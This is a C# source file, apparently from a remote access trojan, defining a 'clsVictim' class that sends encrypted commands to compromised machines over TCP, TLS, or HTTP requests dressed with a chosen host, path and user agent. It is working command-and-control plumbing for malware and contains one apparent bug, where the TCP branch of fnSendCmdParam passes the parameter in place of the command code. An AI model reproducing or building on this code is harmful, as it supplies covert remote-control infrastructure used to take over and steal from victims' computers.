using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net.Security;
using Plugin.Abstractions48;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Windows.Forms;
using System.Threading;
using System.Collections.Concurrent;

namespace winClient48
{
    public class clsVictim
    {
        public Socket socket { get; set; }
        public SslStream m_sslClnt { get; set; }

        public static int MAX_BUFFER_LENGTH = 65536;
        public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
        public string server_ip;
        public int server_port;

        //CRYPTOGRAPHY
        public (string public_key, string private_key) key_pairs;
        public (byte[] key, byte[] iv) _AES;

        public enProtocol m_protocol { get; set; }

        //HTTP
        private string m_szHost { get; set; }
        private string m_szMethod { get; set; }
        private string m_szPath { get; set; }
        private string m_szUA { get; set; }

        public BlockingCollection<byte[]> _tlsSendQueue = new BlockingCollection<byte[]>(new ConcurrentQueue<byte[]>());
        private CancellationTokenSource _tlsCts { get; set; }

        private SemaphoreSlim _tcpSemaphore = new SemaphoreSlim(1, 1);

        public clsVictim(Socket socket)
        {
            this.socket = socket;

            m_protocol = enProtocol.TCP;
        }

        public clsVictim(Socket sktClnt, SslStream sslClnt)
        {
            socket = sktClnt;
            m_sslClnt = sslClnt;

            m_protocol = enProtocol.TLS;

            _tlsCts = new CancellationTokenSource();
            _ = Task.Run(() => fnTlsSendLoop(_tlsCts.Token));
        }

        public clsVictim(Socket socket, string szHost, string szMethod, string szPath, string szUA)
        {
            this.socket = socket;

            m_szHost = szHost;
            m_szMethod = szMethod;
            m_szPath = szPath;
            m_szUA = szUA;

            m_protocol = enProtocol.HTTP;
        }

        ~clsVictim()
        {
            if (_tlsCts != null)
            {
                _tlsSendQueue.CompleteAdding();
                _tlsCts.Cancel();
            }
        }

        public enum enProtocol
        {
            TCP,
            TLS,
            HTTP,
        }

        public async void Send(int cmd, int param, byte[] msg)
        {
            if (msg == null)
                return;

            byte[] buffer = new clsDSP((byte)cmd, (byte)param, msg).GetBytes();
            if (buffer == null)
                return;

            try
            {
                await _tcpSemaphore.WaitAsync();

                socket.Send(buffer);
            }
            catch
            {
                
            }
            finally
            {
                _tcpSemaphore.Release();
            }
        }

        public async void Send(byte[] abBuffer)
        {
            if (abBuffer == null)
                return;

            try
            {
                await _tcpSemaphore.WaitAsync();

                socket.Send(abBuffer);
            }
            catch
            {

            }
            finally
            {
                _tcpSemaphore.Release();
            }
        }

        /// <summary>
        /// Send message string.
        /// </summary>
        /// <param name="cmd">Command code.</param>
        /// <param name="param">Parameter code.</param>
        /// <param name="msg">Message string.</param>
        public void Send(int cmd, int param, string msg)
        {
            Send(cmd, param, Encoding.UTF8.GetBytes(msg));
        }

        /// <summary>
        /// Send message via encrypted channel.
        /// </summary>
        /// <param name="cmd">Command code.</param>
        /// <param name="param">Parameter code.</param>
        /// <param name="data">Data string.</param>
        /// <param name="mode">Message mode.</param>
        public void encSend(int cmd, int param, string data, SendMode mode = SendMode.RAW)
        {
            string enc_data = clsCrypto.AESEncrypt(data, _AES.key, _AES.iv);
            Send(cmd, param, enc_data);
        }

        /// <summary>
        /// Send command string via encrypted channel.
        /// </summary>
        /// <param name="payload"></param>
        /// <param name="mode"></param>
        public void SendCommand(string payload)
        {
            switch (m_protocol)
            {
                case enProtocol.TCP:
                    encSend(2, 0, payload);
                    break;
                case enProtocol.TLS:
                    fnSslSendRAW(2, 0, Encoding.UTF8.GetBytes(payload));
                    break;
                case enProtocol.HTTP:
                    fnHttpSend(clsCrypto.AESEncrypt(payload, _AES.key, _AES.iv));
                    break;
            }
        }

        public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|'));
        public void fnSendCommand(string[] asMsg) => fnSendCommand(asMsg.ToList());
        public void fnSendCommand(List<string> lsMsg)
        {
            SendCommand(string.Join("|", lsMsg));
        }

        public void fnSslSend(string[] asMsg) => fnSslSend(string.Join("|", asMsg));
        public void fnSslSend(List<string> lsMsg) => fnSslSend(string.Join("|", lsMsg));
        public void fnSslSend(string szMsg) => fnSslSendRAW(Encoding.UTF8.GetBytes(szMsg));

        /// <summary>
        /// SSL send raw data.
        /// </summary>
        /// <param name="abBuffer"></param>
        public void fnSslSendRAW(byte[] abBuffer) => fnSslSendRAW(0, 0, abBuffer);

        public void fnSslSendRAW(int nCmd, int nParam, string szMsg) => fnSslSendRAW(nCmd, nParam, Encoding.UTF8.GetBytes(szMsg));

        /// <summary>
        /// SSL send raw data.
        /// </summary>
        /// <param name="nCmd"></param>
        /// <param name="nParam"></param>
        /// <param name="abBuffer"></param>
        /// <returns></returns>
        public void fnSslSendRAW(int nCmd, int nParam, byte[] abBuffer)
        {
            byte[] abData = new clsDSP((byte)nCmd, (byte)nParam, abBuffer).GetBytes();

            _tlsSendQueue.Add(abData);
        }

        public async Task fnTlsSendLoop(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested)
            {
                if (_tlsSendQueue.TryTake(out var data, Timeout.Infinite, ct))
                {
                    try
                    {
                        await m_sslClnt.WriteAsync(data, 0, data.Length, ct);
                        await m_sslClnt.FlushAsync(ct);
                    }
                    catch (Exception ex)
                    {
                        // log error
                        break;
                    }
                }
            }
        }

        /// <summary>
        /// Send HTTP web response.
        /// </summary>
        /// <param name="asMsg"></param>
        public void fnHttpSend(string[] asMsg) => fnHttpSend(asMsg.ToList());
        
        /// <summary>
        /// Send HTTP web response.
        /// </summary>
        /// <param name="lsMsg"></param>
        public void fnHttpSend(List<string> lsMsg) => fnHttpSend(string.Join("|", lsMsg));
        
        /// <summary>
        /// Send HTTP web response.
        /// </summary>
        /// <param name="szMsg"></param>
        public void fnHttpSend(string szMsg) => fnHttpSend(2, 0, szMsg);

        /// <summary>
        /// Send HTTP web response.
        /// </summary>
        /// <param name="nCmd">Command.</param>
        /// <param name="nParam">Parameter</param>
        /// <param name="szMsg">Message, HTTP response body.</param>
        public void fnHttpSend(int nCmd, int nParam, string szMsg)
        {
            clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
            string szBody = Convert.ToBase64String(dsp.GetBytes());

            clsHttpReq req = new clsHttpReq(m_szHost, m_szPath, m_szMethod, m_szUA, szBody);
            Send(req.fnabGetRequest());
        }

        public void fnSendCmdParam(int nCmd, int nParam)
        {
            string szMsg = clsEZData.fnGenerateRandomStr();
            byte[] abData = Encoding.UTF8.GetBytes(szMsg);

            switch (m_protocol)
            {
                case enProtocol.TCP:
                    Send(nParam, nParam, abData);
                    break;
                case enProtocol.TLS:
                    fnSslSendRAW(nCmd, nParam, abData);
                    break;
                case enProtocol.HTTP:
                    fnHttpSend(nCmd, nParam, szMsg);
                    break;
            }
        }
    }
}
